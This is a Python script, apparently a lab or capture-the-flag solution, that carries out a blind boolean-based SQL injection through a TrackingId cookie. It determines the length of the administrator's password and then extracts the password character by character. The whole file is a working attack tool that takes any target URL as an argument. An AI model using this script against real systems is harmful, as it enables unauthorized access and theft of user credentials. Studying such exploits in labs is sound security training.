import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#Blind SQL injection with conditional response
#finding the length and extracting password of administrator user

def sqli_password_length(url):
    for i in range(1, 50): 
        sqli_payload = "' and (select length(password) from users where username='administrator')='%d'--" % i
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)

        cookies = {'TrackingId': 'tVERcMpBwJ1q1kjV' + sqli_payload_encoded, 'session': 's7Q5Mz69eVD6d2siKp5h5jZS1QQOunW7'}
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        
        sys.stdout.write('\rTrying length: %d' % i)
        sys.stdout.flush()
        
        if "Welcome" in r.text:
            print(" \nPassword length found: %d" % i)
            return i
    
    print("Password length not found.")
    return False

def sqli_password(url, password_length):
    print("Extracting password.")
    password_extracted = ""
    
    for i in range(1, password_length + 1):
        for j in range(32, 126):  
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'tVERcMpBwJ1q1kjV' + sqli_payload_encoded, 'session': 's7Q5Mz69eVD6d2siKp5h5jZS1QQOunW7'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            
            if "Welcome"  in r.text:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                
    print("\n Password successfully extracted: %s" % password_extracted)
    return password_extracted

def main():
    if len(sys.argv) != 2:
        print("Give URL: %s <url>" % sys.argv[0])
        sys.exit(1)
        
    url = sys.argv[1]
    
    password_length = sqli_password_length(url)
    
    sqli_password(url, password_length)

if __name__ == "__main__":
    main()
